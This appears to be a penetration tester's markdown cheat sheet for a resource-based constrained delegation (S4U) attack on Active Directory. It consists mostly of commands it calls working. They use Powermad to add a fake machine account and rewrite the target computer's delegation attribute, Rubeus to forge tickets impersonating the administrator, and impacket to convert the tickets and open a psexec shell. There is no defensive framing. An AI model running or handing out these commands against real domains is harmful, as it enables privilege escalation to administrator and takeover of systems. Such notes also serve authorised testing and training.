# resource based constrained delegation S4U attack
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#resource-based-constrained-delegation
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
- transfer scripts and rubeus
- follow directions from hacktricks
- replace all the options for domain and the hashes provided
- working powershell commands included below

## powershell commands on target
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
- powermad https://github.com/Kevin-Robertson/Powermad
- targetComputer = the machine to privesc
- FAKECOMPUTER = the machine we added
- use rubeus to hash
- replace hashes in s4u command
- replace domain and FQDN

```powershell
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

# substitute domain
.\Rubeus.exe hash /password:'p@ssword!' /user:FAKECOMPUTER$ /domain:domain.local
# substitute hashes, domain, fqdn
.\rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:HASH_HERE /aes128:HASH_HERE /rc4:HASH_HERE /impersonateuser:administrator /msdsspn:cifs/FQDNMachine.domain.local /domain:domain.local /ptt
# copy base64 from smb ticket to your machine and decode it to do impacket-psexec

# alternate command - request all kinds of tickets
.\rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:HASH_HERE /aes128:HASH_HERE /rc4:HASH_HERE /impersonateuser:administrator /msdsspn:cifs/FQDNMachine.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

## transfering tickets to attacker machine to psexec
### convert kirbi to ccache
tickets printed by rubeus are base64 encoded kirbi files.
convert with `impacket-ticketConverter`.
```bash
base64 -d smb.ticket.b64 > smb.ticket.kirbi
impacket-ticketConverter smb.ticket.kirbi smb.ticket.ccache
export KRB5CCNAME=$(pwd)/smb.ticket.ccache
impacket-psexec domain.local/Administrator@FQDNMachine.domain.local -k -no-pass
```
